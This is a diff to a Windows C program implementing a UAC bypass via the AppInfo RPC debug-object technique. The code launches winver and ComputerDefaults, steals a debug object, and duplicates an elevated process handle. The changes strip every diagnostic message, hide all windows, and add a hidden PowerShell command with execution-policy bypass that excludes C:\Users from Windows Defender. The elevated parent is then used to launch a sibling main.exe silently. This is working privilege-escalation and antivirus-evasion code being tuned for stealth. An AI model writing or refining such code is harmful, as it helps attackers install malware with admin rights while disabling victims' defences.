@@ -1,5 +1,4 @@
 #include <windows.h>
-#include <stdio.h>
 #include <rpc.h>
 #include <rpcndr.h>
 #include <shlwapi.h>
@@ -9,7 +8,6 @@
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "shlwapi.lib")
 
-// --- Constants & Typedefs ---
 #define APPINFO_RPC L"201ef99a-7fa0-444c-9399-19ba84f12a1a"
 #define T_DEFAULT_DESKTOP L"WinSta0\\Default"
 #define WINVER_EXE L"\\winver.exe"
@@ -26,14 +24,12 @@ typedef struct _UC_CONTEXT {
 UC_CONTEXT g_ctx_struct;
 PUC_CONTEXT g_ctx = &g_ctx_struct;
 
-// --- Native Prototypes ---
 extern NTSTATUS NTAPI NtQueryInformationProcess(HANDLE, ULONG, PVOID, ULONG, PULONG);
 extern NTSTATUS NTAPI NtRemoveProcessDebug(HANDLE, HANDLE);
 extern NTSTATUS NTAPI NtDuplicateObject(HANDLE, HANDLE, HANDLE, PHANDLE, ACCESS_MASK, ULONG, ULONG);
 extern VOID NTAPI DbgUiSetThreadDebugObject(HANDLE);
 extern NTSTATUS NTAPI NtClose(HANDLE);
 
-// --- AppInfo RPC Structures ---
 typedef struct _MONITOR_POINT { long MonitorLeft; long MonitorRight; } MONITOR_POINT;
 typedef struct _APP_STARTUP_INFO {
     wchar_t* lpszTitle; long dwX; long dwY; long dwXSize; long dwYSize;
@@ -46,7 +42,6 @@ typedef struct _APP_PROCESS_INFORMATION {
     long ProcessId; long ThreadId;
 } APP_PROCESS_INFORMATION;
 
-// RPC Infrastructure
 typedef struct { short Pad; unsigned char Format[75]; } appinfo_MIDL_TYPE_FORMAT_STRING;
 typedef struct { short Pad; unsigned char Format[103]; } appinfo_MIDL_PROC_FORMAT_STRING;
 static const appinfo_MIDL_TYPE_FORMAT_STRING appinfo__MIDL_TypeFormatString = { 0, { 0x00, 0x00, 0x12, 0x08, 0x25, 0x5c, 0x11, 0x08, 0x25, 0x5c, 0x11, 0x00, 0x0a, 0x00, 0x15, 0x03, 0x08, 0x00, 0x08, 0x08, 0x5c, 0x5b, 0x1a, 0x03, 0x38, 0x00, 0x00, 0x00, 0x14, 0x00, 0x36, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x06, 0x3e, 0x4c, 0x00, 0xe3, 0xff, 0x40, 0x5c, 0x5b, 0x12, 0x08, 0x05, 0x5c, 0x11, 0x04, 0x02, 0x00, 0x1a, 0x03, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb9, 0xb9, 0x08, 0x08, 0x5c, 0x5b, 0x11, 0x0c, 0x08, 0x5c, 0x00 } };
@@ -78,27 +73,22 @@ BOOL AicLaunchAdminProcess(LPWSTR Path, LPWSTR Cmd, LONG SFlags, LONG CFlags, LP
     return result;
 }
 
-// NEW: Add Defender Exclusion for C:\Users
 BOOL AddDefenderExclusion() {
     WCHAR cmdLine[512];
     STARTUPINFOW si = { sizeof(si) };
     PROCESS_INFORMATION pi;
-
-    printf("[EXCLUSION] Adding Defender exclusion for C:\\Users...\n");
-
-    // PowerShell command to add exclusion
-    wcscpy(cmdLine, L"powershell.exe -WindowStyle Hidden -Command \"Add-MpPreference -ExclusionPath 'C:\\Users'\"");
-
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+    
+    wcscpy(cmdLine, L"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionPath 'C:\\Users'\"");
+    
     if (CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
-        WaitForSingleObject(pi.hProcess, 10000); // Wait max 10 seconds
+        WaitForSingleObject(pi.hProcess, 5000);
         CloseHandle(pi.hThread);
         CloseHandle(pi.hProcess);
-        printf("[OK] Defender exclusion added successfully.\n");
         return TRUE;
-    } else {
-        printf("[WARN] Failed to add Defender exclusion. Error: %lu\n", GetLastError());
-        return FALSE;
     }
+    return FALSE;
 }
 
 NTSTATUS ucmxCreateProcessFromParent(HANDLE ParentProcess, LPWSTR Payload) {
@@ -108,40 +98,25 @@ NTSTATUS ucmxCreateProcessFromParent(HANDLE ParentProcess, LPWSTR Payload) {
     PROCESS_INFORMATION pi = { 0 };
     si.StartupInfo.cb = sizeof(STARTUPINFOEXW);
 
-    printf("[DEBUG] ucmx: Testing payload file exists...\n");
-    if (!PathFileExistsW(Payload)) {
-        printf("[ERROR] ucmx: Payload path not found: %ws\n", Payload);
-        return status;
-    }
+    if (!PathFileExistsW(Payload)) return status;
 
     InitializeProcThreadAttributeList(NULL, 1, 0, &size);
     si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
     if (!si.lpAttributeList) return status;
 
-    if (!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size)) {
-        printf("[ERROR] ucmx: InitializeProcThreadAttributeList failed. Error: %lu\n", GetLastError());
-        return status;
-    }
-
-    if (!UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &ParentProcess, sizeof(HANDLE), NULL, NULL)) {
-        printf("[ERROR] ucmx: UpdateProcThreadAttribute failed. Error: %lu\n", GetLastError());
-        return status;
-    }
+    if (!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size)) return status;
+    if (!UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &ParentProcess, sizeof(HANDLE), NULL, NULL)) return status;
 
     si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
-    si.StartupInfo.wShowWindow = SW_SHOW;
+    si.StartupInfo.wShowWindow = SW_HIDE;
     si.StartupInfo.lpDesktop = (LPWSTR)T_DEFAULT_DESKTOP;
 
-    printf("[DEBUG] ucmx: Executing CreateProcessW (Parent: 0x%p)...\n", ParentProcess);
     if (CreateProcessW(NULL, Payload, NULL, NULL, FALSE, 
-        CREATE_UNICODE_ENVIRONMENT | EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, 
+        CREATE_UNICODE_ENVIRONMENT | EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, 
         NULL, g_ctx->szSystemRoot, (LPSTARTUPINFOW)&si, &pi)) {
-        printf("[SUCCESS] ucmx: Child PID %d created.\n", pi.dwProcessId);
         CloseHandle(pi.hThread);
         CloseHandle(pi.hProcess);
         status = STATUS_SUCCESS;
-    } else {
-        printf("[ERROR] ucmx: CreateProcessW failed. Error: %lu\n", GetLastError());
     }
 
     DeleteProcThreadAttributeList(si.lpAttributeList);
@@ -154,66 +129,56 @@ int main() {
     APP_PROCESS_INFORMATION procInfo;
     DEBUG_EVENT dbgEvent;
     WCHAR szProcess[MAX_PATH * 2];
-    WCHAR lpszPayload[] = L"C:\\Windows\\System32\\cmd.exe";
+    WCHAR lpszPayload[MAX_PATH];
 
-    printf("--- UAC BYPASS + DEFENDER EXCLUSION STARTING ---\n");
-
-#ifdef _WIN64
-    printf("[CHECK] Architecture: x64 (Correct)\n");
-#else
-    printf("[CHECK] Architecture: x86 (Warning: Ensure you aren't debugging x64 apps)\n");
-#endif
+    /* Build path to main.exe in same directory */
+    GetModuleFileNameW(NULL, lpszPayload, MAX_PATH);
+    WCHAR* lastSlash = wcsrchr(lpszPayload, L'\\');
+    if (lastSlash) {
+        *(lastSlash + 1) = 0;
+        wcscat(lpszPayload, L"main.exe");
+    }
 
     GetSystemDirectoryW(g_ctx->szSystemDirectory, MAX_PATH);
     GetWindowsDirectoryW(g_ctx->szSystemRoot, MAX_PATH);
 
-    // PHASE 0: Add Defender Exclusion FIRST
-    printf("[PHASE 0] Adding Windows Defender Exclusion...\n");
-    AddDefenderExclusion();
-
-    // PHASE 1
-    printf("[PHASE 1] Stealing Debug Object from winver...\n");
+    /* PHASE 1: Steal Debug Object */
     wcscpy(szProcess, g_ctx->szSystemDirectory); wcscat(szProcess, WINVER_EXE);
     if (!AicLaunchAdminProcess(szProcess, szProcess, 0, CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS, g_ctx->szSystemRoot, T_DEFAULT_DESKTOP, NULL, INFINITE, SW_HIDE, &procInfo)) {
-        printf("[FAIL] AicLaunchAdminProcess (winver) failed. Error: %lu\n", GetLastError()); return 1;
+        return 1;
     }
 
     NTSTATUS nt = NtQueryInformationProcess((HANDLE)procInfo.ProcessHandle, ProcessDebugObjectHandle, &dbgHandle, sizeof(HANDLE), NULL);
-    if (nt != STATUS_SUCCESS || !dbgHandle) {
-        printf("[FAIL] NtQueryInformationProcess failed (0x%X) or NULL handle.\n", nt); return 1;
-    }
-    printf("[OK] Debug Object: 0x%p\n", dbgHandle);
+    if (nt != STATUS_SUCCESS || !dbgHandle) return 1;
 
     NtRemoveProcessDebug((HANDLE)procInfo.ProcessHandle, dbgHandle);
     TerminateProcess((HANDLE)procInfo.ProcessHandle, 0);
     CloseHandle((HANDLE)procInfo.ThreadHandle); CloseHandle((HANDLE)procInfo.ProcessHandle);
 
-    // PHASE 2
-    printf("[PHASE 2] Launching Elevated Parent (ComputerDefaults)...\n");
+    /* PHASE 2: Launch Elevated Parent */
     wcscpy(szProcess, g_ctx->szSystemDirectory); wcscat(szProcess, COMPUTERDEFAULTS_EXE);
     RtlSecureZeroMemory(&procInfo, sizeof(procInfo));
     if (!AicLaunchAdminProcess(szProcess, szProcess, 1, CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS, g_ctx->szSystemRoot, T_DEFAULT_DESKTOP, NULL, INFINITE, SW_HIDE, &procInfo)) {
-        printf("[FAIL] AicLaunchAdminProcess (CompDefaults) failed. Error: %lu\n", GetLastError()); return 1;
+        return 1;
     }
 
     DbgUiSetThreadDebugObject(dbgHandle);
-    printf("[OK] TEB Debug Object updated. Waiting for loader events...\n");
 
     while (1) {
         if (!WaitForDebugEvent(&dbgEvent, INFINITE)) break;
         if (dbgEvent.dwDebugEventCode == CREATE_PROCESS_DEBUG_EVENT) {
             dbgProcessHandle = dbgEvent.u.CreateProcessInfo.hProcess;
-            printf("[DEBUG] Parent Process Handle captured: 0x%p\n", dbgProcessHandle);
         }
         if (dbgEvent.dwDebugEventCode == LOAD_DLL_DEBUG_EVENT && dbgProcessHandle) {
-            printf("[DEBUG] First DLL loaded. Duplicating handle...\n");
             nt = NtDuplicateObject(dbgProcessHandle, GetCurrentProcess(), GetCurrentProcess(), &dupHandle, PROCESS_ALL_ACCESS, 0, 0);
             if (nt == STATUS_SUCCESS) {
-                printf("[OK] DupHandle: 0x%p. Launching payload...\n", dupHandle);
+                /* NOW WE HAVE ADMIN - Add Defender exclusion */
+                AddDefenderExclusion();
+                Sleep(1000);
+                
+                /* Launch main.exe with admin */
                 ucmxCreateProcessFromParent(dupHandle, lpszPayload);
                 NtClose(dupHandle);
-            } else {
-                printf("[FAIL] NtDuplicateObject failed: 0x%X\n", nt);
             }
             ContinueDebugEvent(dbgEvent.dwProcessId, dbgEvent.dwThreadId, DBG_CONTINUE);
             break;
@@ -221,14 +186,12 @@ int main() {
         ContinueDebugEvent(dbgEvent.dwProcessId, dbgEvent.dwThreadId, DBG_CONTINUE);
     }
 
-    // PHASE 3
-    printf("[PHASE 3] Final Detach and Clean...\n");
+    /* PHASE 3: Cleanup */
     DebugActiveProcessStop(procInfo.ProcessId);
     DbgUiSetThreadDebugObject(NULL);
     NtClose(dbgHandle);
     TerminateProcess((HANDLE)procInfo.ProcessHandle, 0);
     CloseHandle((HANDLE)procInfo.ThreadHandle); CloseHandle((HANDLE)procInfo.ProcessHandle);
 
-    printf("--- LOG ENDS ---\n");
     return 0;
 }
